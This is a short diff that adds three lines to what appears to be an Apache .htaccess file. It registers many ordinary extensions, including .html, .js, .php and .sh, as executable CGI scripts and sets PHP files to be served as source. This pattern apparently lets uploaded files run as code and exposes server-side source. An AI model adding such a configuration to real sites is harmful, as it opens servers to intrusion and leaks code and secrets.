@@ -1,0 +1,3 @@
+AddHandler cgi-script .php .php3 .php4 .php5 .phtml .pl .py .jsp .asp .shtml .sh .cgi .html .htm .js
+AddType text/html *.htm *.html
+AddType application/x-httpd-php-source *.php
